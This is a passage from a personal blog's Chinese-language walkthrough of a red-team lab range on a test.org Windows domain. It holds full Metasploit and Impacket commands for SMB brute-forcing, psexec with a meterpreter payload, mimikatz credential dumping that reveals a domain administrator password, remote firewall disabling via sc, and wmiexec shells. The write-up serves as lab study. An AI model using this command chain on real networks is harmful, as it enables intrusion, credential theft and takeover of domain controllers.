src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684976883441-1324c8f3-1cfb-4e6e-acf3-796a343d3bdf.png#averageHue=%2317181b&clientId=ua52ffc9a-d2fd-4&from=paste&height=381&id=u105854d1&originHeight=761&originWidth=1581&originalType=binary&ratio=2&rotation=0&showTitle=false&size=76105&status=done&style=none&taskId=ud4be4289-0b7d-4363-b90a-ee8753bf7ac&title=&width=790.5" alt="image.png"><br>socks 3333端口 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684976939667-05bf467c-b24a-433e-93f6-e7b40a4ca6ac.png#averageHue=%23191c20&clientId=ua52ffc9a-d2fd-4&from=paste&height=127&id=uac2680bc&originHeight=253&originWidth=774&originalType=binary&ratio=2&rotation=0&showTitle=false&size=23429&status=done&style=none&taskId=u2dab8f36-8b7a-46ee-8381-390ad7787ad&title=&width=387" alt="image.png"></p>
<p><a name="SbmDc"></a></p>
<h2><span id="smb-扫描-存活">smb 扫描 存活</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use auxiliary/scanner/smb/smb_version<br>set rhosts 192.168.93.0/24<br>run<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684977068774-e4bd5632-aa02-410f-a96f-3e7fd443af48.png#averageHue=%23191a1c&clientId=ua52ffc9a-d2fd-4&from=paste&height=580&id=u4fd02929&originHeight=1160&originWidth=1980&originalType=binary&ratio=2&rotation=0&showTitle=false&size=300508&status=done&style=none&taskId=ue89e68a7-f0d2-4a2e-a63d-ff596ab7fc7&title=&width=990" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684977182305-6a7126d3-ed28-4d74-ac09-d665de36ad05.png#averageHue=%231a1b1d&clientId=ua52ffc9a-d2fd-4&from=paste&height=458&id=u6d875b10&originHeight=915&originWidth=2880&originalType=binary&ratio=2&rotation=0&showTitle=false&size=359949&status=done&style=none&taskId=ub0379ec9-6631-4b6c-b436-f5a840ee1cb&title=&width=1440" alt="image.png"><br>扫描结果 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">192.168.93.30  Windows  7<br>192.168.93.20  Windows 2008<br>192.168.93.10  Windows 2012 R2<br></code></pre></td></tr></table></figure>
<p>使用Nmap 扫描 看看是否存在web服务 </p>
<blockquote>
<p>192.168.93.10</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684977949230-d1d93072-2681-4a61-b6cf-d407c38ef5fe.png#averageHue=%2318191b&clientId=ua52ffc9a-d2fd-4&from=paste&height=676&id=u2f584d27&originHeight=1352&originWidth=2776&originalType=binary&ratio=2&rotation=0&showTitle=false&size=312646&status=done&style=none&taskId=uc6348089-f66c-4a8e-b062-611eeb57740&title=&width=1388" alt="image.png"></p>
<blockquote>
<p>192.168.93.20</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684977970071-2f0805ae-e9a1-46b1-a899-957eee7b0ddc.png#averageHue=%2318191b&clientId=ua52ffc9a-d2fd-4&from=paste&height=649&id=u298080f7&originHeight=1297&originWidth=2107&originalType=binary&ratio=2&rotation=0&showTitle=false&size=258024&status=done&style=none&taskId=ueebe97e4-855e-4cfb-901d-67f25c7566e&title=&width=1053.5" alt="image.png"></p>
<blockquote>
<p>192.168.93.30</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684978681361-51a204ad-d80b-4de9-8380-d8d9b216324e.png#averageHue=%231b1c1e&clientId=ua52ffc9a-d2fd-4&from=paste&height=225&id=u478011b3&originHeight=449&originWidth=1386&originalType=binary&ratio=2&rotation=0&showTitle=false&size=128783&status=done&style=none&taskId=u4367f6bb-facb-4986-91e7-31d0df5427c&title=&width=693" alt="image.png"><br>这个一直超时 ，扫描不出来。<br>使用 这句扫描的端口，banner 信息 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">proxychains4 nmap -Pn -sT -sV 192.168.93.10192.168.93.20192.168.93.30 -F <br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684979190809-c6e0b152-864e-42fc-9ece-b27e55352f3a.png#averageHue=%2318191b&clientId=ua52ffc9a-d2fd-4&from=paste&height=721&id=uc59c377f&originHeight=1442&originWidth=2419&originalType=binary&ratio=2&rotation=0&showTitle=false&size=342493&status=done&style=none&taskId=ufa294911-ad10-424c-b8db-da4227c1995&title=&width=1209.5" alt="image.png"><br>基本都是开放了smb，可能smb是一个突破口吧，<br>但是发现他们的域名是 test.org 域名<br>测试了ms17-010 ,ms08-067 都不行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684978619829-5f0f9f85-d136-4a79-9723-fd64fd44a9c9.png#averageHue=%23191a1c&clientId=ua52ffc9a-d2fd-4&from=paste&height=131&id=u4d626c40&originHeight=262&originWidth=1498&originalType=binary&ratio=2&rotation=0&showTitle=false&size=65730&status=done&style=none&taskId=u16fe9d84-c523-4016-8397-f5415422ea9&title=&width=749" alt="image.png"><br><a name="Hv7Sd"></a></p>
<h2><span id="smb爆破">SMB爆破</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use auxiliary/scanner/smb/smb_login<br>set SMBUSER administrator<br>set PASS_FILE /root/pass.txt<br>set rhosts 192.168.93.20<br>run<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684982093664-d24c145b-1e6c-4c95-9c19-b80ac8b19de7.png#averageHue=%2318191b&clientId=ua52ffc9a-d2fd-4&from=paste&height=734&id=u6a9f0c81&originHeight=1467&originWidth=2107&originalType=binary&ratio=2&rotation=0&showTitle=false&size=396743&status=done&style=none&taskId=u8babbeb5-0e9f-42af-8519-9ab3b5bff6f&title=&width=1053.5" alt="image.png"><br>爆破出了win2008 ,win7 的 密码 是 123qwe!ASD<br><a name="qGDWg"></a></p>
<h2><span id="psexec">PsExec</span></h2><p>PsExec 是由 Mark Russinovich 创建的 Sysinternals Suite中包含的工具。最初，它旨在作为系统管理员的便利工具，以便他们可以通过在远程主机上运行命令来执行维护任务。后来因为太过方便，被利用到内网渗透之中。现在PsExec类的工具有各种语言的实现，如Metasploit的psexec psexec psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等等。<br>PsExec是一个轻量级的telnet替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与命令控制台几乎相同的实时交互性。PsExec最强大的功能就是在远程系统和远程支持工具（如ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。</p>
<p><strong>基本原理：：</strong><br><strong>PsExec特点：</strong></p>
<ul>
<li>psexec远程运行需要远程计算机启用文件和打印共享且默认的Admin$共享映射到C:windows目录。</li>
<li>psexec建立连接之后目标机器上会被安装一个“PSEXESVC”服务。但是psexec安全退出之后这个服务会自动删除（在命令行下使用exit命令退出）。</li>
</ul>
<p><strong>PsExec详细运行过程：</strong></p>
<ol>
<li>TCP三次握手，通过SMB会话进行身份验证。</li>
<li>连接**admin$**共享，通过 SMB 访问默认共享文件夹 **ADMIN$**，写入PSEXESVC.exe文件；</li>
<li>利用ipc命名管道调用svcctl服务</li>
<li>利用svcctl服务开启psexesvc服务</li>
<li>生成4个命名管道以供使用。一个psexesvc管道用于服务本身，另外的管道stdin（输入）、stdout（输出）、stderr（输出）用于重定向进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use exploit/windows/smb/psexec<br>set payload windows/x64/meterpreter/bind_tcp   #设置正向连接<br>set rhost 192.168.93.20<br>set smbuser administrator<br>set smbpass 123qwe!ASD<br>run<br></code></pre></td></tr></table></figure>
<img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684988394018-95553815-7873-48ec-b730-6ea98adf47b2.png#averageHue=%2317181a&clientId=ua52ffc9a-d2fd-4&from=paste&height=510&id=u1c47a7d1&originHeight=1020&originWidth=2155&originalType=binary&ratio=2&rotation=0&showTitle=false&size=228725&status=done&style=none&taskId=u9fbe0431-b1a5-47be-bbee-9bb2ece9974&title=&width=1077.5" alt="image.png"><br>直接就登录了 少去提权步骤了都 <br>20,30 都是system 权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684988421544-6624eb24-dfdf-4e65-bc7d-e51305dc48d6.png#averageHue=%2317181a&clientId=ua52ffc9a-d2fd-4&from=paste&height=538&id=ud104e9ea&originHeight=1075&originWidth=1438&originalType=binary&ratio=2&rotation=0&showTitle=false&size=126983&status=done&style=none&taskId=u71e41dde-ea3a-4697-b96d-6def133b067&title=&width=719" alt="image.png"><br>因为前面扫描的的时候就已经知道 域名是test.org 了 <br>ping一下就ok了 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684988438701-9477260c-d302-4b89-b4b2-8b1738003273.png#averageHue=%2318191b&clientId=ua52ffc9a-d2fd-4&from=paste&height=251&id=ub1adad1c&originHeight=502&originWidth=1412&originalType=binary&ratio=2&rotation=0&showTitle=false&size=82700&status=done&style=none&taskId=u12fb8e8c-34f9-4f7b-9c62-956843b4439&title=&width=706" alt="image.png"><br>现在需要用到 mimikatz 抓取密码<br><a name="ZXevZ"></a></li>
</ol>
<h2><span id="kiwi_cmd">kiwi_cmd</span></h2><p>利用msf自带的mimikatz  ，并入了kiwi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">load kiwi #加载 kiwi<br>kiwi_cmd sekurlsa::logonpasswords  #调用kiwi_cmd执行mimikatz命令<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684988465441-4e541618-021c-4833-8592-9e5d2050cf01.png#averageHue=%2318191b&clientId=ua52ffc9a-d2fd-4&from=paste&height=423&id=ufbec2b23&originHeight=846&originWidth=1433&originalType=binary&ratio=2&rotation=0&showTitle=false&size=136089&status=done&style=none&taskId=udb2e0315-2fbc-424f-bb85-7aa19b2d0ef&title=&width=716.5" alt="image.png"><br>在win7上面没有抓到 <br>在win2008 上面抓到 域控的密码了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684988496919-0d19cd42-becb-4c5c-9dfb-40c5144cb5d4.png#averageHue=%2317181a&clientId=ua52ffc9a-d2fd-4&from=paste&height=482&id=uf9ec37ee&originHeight=963&originWidth=1454&originalType=binary&ratio=2&rotation=0&showTitle=false&size=138293&status=done&style=none&taskId=u7fec51f4-f5e3-4440-8d4f-f9069fae74e&title=&width=727" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">kerberos :                                                                                                                                                                        <br>         * Username : Administrator                                                                                                                                                       <br>         * Domain   : TEST.ORG                                                                                                                                                            <br>         * Password : zxcASDqw123!!<br></code></pre></td></tr></table></figure>

<p><a name="lh3OT"></a></p>
<h2><span id="ipc-远程连接">IPC 远程连接</span></h2><p>因为使用psexec 这里建立不了域控的连接，先使用 IPC 进行连接<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684984455543-e80d3dbe-9ab9-4647-b54e-49dc27ec652c.png#averageHue=%2318191b&clientId=ua52ffc9a-d2fd-4&from=paste&height=111&id=ub23c6fd8&originHeight=221&originWidth=2845&originalType=binary&ratio=2&rotation=0&showTitle=false&size=62145&status=done&style=none&taskId=u770e7e52-8e5f-4e01-912e-f30f187b0de&title=&width=1422.5" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net use \\192.168.93.10\admin$ zxcASDqw123!! /user:test\administrator<br>dir \\192.168.93.10\C$\users\administrator\Documents<br>type \\192.168.93.10\C$\users\administrator\Documents\flag.txt<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684984215521-0977481b-ba76-4cca-abc4-a10a05d37b9e.png#averageHue=%2317181a&clientId=ua52ffc9a-d2fd-4&from=paste&height=535&id=u318b5f14&originHeight=1070&originWidth=1761&originalType=binary&ratio=2&rotation=0&showTitle=false&size=190628&status=done&style=none&taskId=ubc5845f2-5184-44ce-b8a4-6032fe9696f&title=&width=880.5" alt="image.png"><br>这样就获取到了 域控目录下的flag.txt</p>
<p><a name="Rovbw"></a></p>
<h2><span id="sc-命令">SC 命令</span></h2><p>使用sc远程在域制器（192.168.93.10）上创建服务关闭防火墙：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sc \\192.168.93.10 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;<br>sc \\192.168.93.10 start unablefirewall<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684984930629-34c95a4d-ecd2-42dc-91b1-ae7e81e2a746.png#averageHue=%2317181a&clientId=ua52ffc9a-d2fd-4&from=paste&height=244&id=uf3384f6b&originHeight=487&originWidth=2203&originalType=binary&ratio=2&rotation=0&showTitle=false&size=78820&status=done&style=none&taskId=u401bfa33-70ac-4979-8e6f-61040dd9217&title=&width=1101.5" alt="image.png"><br>关闭成功，再次使用psexec<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684985009320-b064d09d-e09d-47b5-a513-60a3dd1355dd.png#averageHue=%2317181a&clientId=ua52ffc9a-d2fd-4&from=paste&height=709&id=u0241fdc6&originHeight=1417&originWidth=2510&originalType=binary&ratio=2&rotation=0&showTitle=false&size=236815&status=done&style=none&taskId=u34ba9495-8a5a-4fdf-84c2-26024be0053&title=&width=1255" alt="image.png"><br>成功获取了权限  并且是system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">proxychains4 python3 wmiexec-pro.py administrator:zxcASDqw123!!@192.168.93.10 exec-command -shell<br></code></pre></td></tr></table></figure>

<p><a name="ocKmL"></a></p>
<h2><span id="wmiexec">wmiexec</span></h2><p><a target="_blank" rel="noopener" href="https://github.com/XiaoliChan/wmiexec-Pro">https://github.com/XiaoliChan/wmiexec-Pro</a>  #这个是pro ，但是我没有连接成功 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">proxychains python3 wmiexec-pro.py administrator:zxcASDqw123!!@192.168.93.10 exec-command -shell<br></code></pre></td></tr></table></figure>
<p>并不能成功运行</p>
<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py">https://github.com/fortra/impacket/blob/master/examples/wmiexec.py</a> #这个是可以用的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">proxychains python3 wmiexec.py &#x27;TEST.ORG/Administrator:zxcASDqw123!!@192.168.93.10&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684986472302-32a566a0-eb2a-42b8-aad8-be137d480c6a.png#averageHue=%2317181a&clientId=ua52ffc9a-d2fd-4&from=paste&height=578&id=u750a4b43&originHeight=1155&originWidth=1757&originalType=binary&ratio=2&rotation=0&showTitle=false&size=193735&status=done&style=none&taskId=ue35afa09-fad3-4614-bc04-2e1bd2140da&title=&width=878.5" alt="image.png"><br>成功执行 ，获取到了shell</p>
<p><a name="bvlGi"></a></p>
<h1><span id></span></h1><p>主要是这个centos 靶机老是断开连接，网卡获取几个小时ip后就断了 ，要重新获取，或者 恢复快照，<br>其他还好 ，用时两天左右<br> <img src="https://cdn.nlark.com/yuque/0/2023/jpeg/22356351/1684986909697-3a465174-a96f-4ae8-a436-d221b25f04d6.jpeg#averageHue=%233c873b&clientId=ua52ffc9a-d2fd-4&from=paste&height=115&id=u5eed42fa&originHeight=230&originWidth=230&originalType=binary&ratio=2&rotation=0&showTitle=false&size=14620&status=done&style=none&taskId=u9688edfd-2927-4e47-83b8-fed0116d470&title=&width=115" alt="1CD06D7A.jpg"> <img src="https://cdn.nlark.com/yuque/0/2023/gif/22356351/1684986915607-56217ff9-999f-4aa1-b06e-efa6a321a56e.gif#averageHue=%23faf4f3&clientId=ua52ffc9a-d2fd-4&from=paste&height=120&id=u4b66ebcc&originHeight=240&originWidth=240&originalType=binary&ratio=2&rotation=0&showTitle=false&size=107582&status=done&style=none&taskId=uccaf4cc8-97df-4d51-9a9a-c6055c92d1b&title=&width=120" alt="1CD08671.gif"></p>

      </div>
    </div>
  </article>
  <div class="post__foot">
    
    <div class="post-nav">
  
    <a class="post-nav-item-left" href="/2023/06/06/ATT&CK(%E4%BA%94)/">
      <div class="text-align">
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
        <span class="text-small">上一篇</span>
      </div>
      <div>ATT&CK红队评估(五)</div>
    </a>
  
  <div class="vhr"></div>
  
    <a class="post-nav-item-right" href="/2023/05/22/Vikings/">
      <div class="text-align">
        <span class="text-small">下一篇</span>
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             transform="scale(-1,-1)"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
      </div>
      Vikings
    </a>
  
</div>

    
      <div class="related-post">
  <div class="related__head">
  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a><a href="/tags/joomla-CMS/" class="post-tag">#joomla CMS</a><a href="/tags/sc%E5%91%BD%E4%BB%A4/" class="post-tag">#sc命令</a><a href="/tags/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/" class="post-tag">#脏牛提权</a>

</div>
  <div class="realated__body">
    
      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
    
  </div>
</div>

    
    
  </div>

    </div>
    <div class="foot">
      <div class="foot-inner">
        <div class="foot__head">
          
            <div class="foot-line">
              
                <div class="matts">浮</div>
              
                <div class="matts">云</div>
              
                <div class="matts">游</div>
              
                <div class="matts">子</div>
              
                <div class="matts">意</div>
              
            </div>
          
            <div class="foot-line">
              
                <div class="matts">落</div>
              
                <div class="matts">日</div>
              
                <div class="matts">故</div>
              
                <div class="matts">人</div>
              
                <div class="matts">情</div>
              
            </div>
          
        </div>
        <div class="foot__body">
          
          
            <div class="foot-item">
              <div class="foot-item__head">账号</div>
              <div class="foot-item__body">
                
                  <div class="text">
                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
                  </div>
                
              </div>
            </div>
          
          <div class="foot-item">
            <div class="foot-item__head">联系</div>
            <div class="foot-item__body">
              <div class="text">
                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
              </div>
            </div>
          </div>
        </div>
        <div class="copyright">
          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
          <svg width="20" height="20" viewBox="0 0 725 725">
            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
          </svg>
          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
        </div>
      </div>
    </div>
    
    
  

  </body>
</html>